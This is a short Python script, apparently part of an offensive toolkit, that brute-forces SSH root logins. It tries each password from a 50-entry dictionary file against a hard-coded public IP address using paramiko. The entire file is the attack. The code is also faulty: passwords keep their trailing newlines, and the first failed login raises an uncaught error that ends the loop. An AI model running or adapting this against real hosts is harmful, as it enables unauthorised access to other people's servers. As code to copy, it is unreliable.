#!/usr/bin/python
# __author__ = 'jasonsheh'
# -*- coding:utf-8 -*-

import paramiko


class Ssh:
    def __init__(self, target):
        self.target = target

    def connect(self):
        with open('../dict/pwd50.txt') as file:
            for password in file:
                s = paramiko.SSHClient()
                s.set_missing_host_key_policy(paramiko.AutoAddPolicy())

                s.connect(hostname=self.target, port=22, username='root', password=password)

                s.close()

    def run(self):
        self.connect()


def main():
    f = Ssh(target='115.159.160.21')
    f.run()

if __name__ == '__main__':
    main()
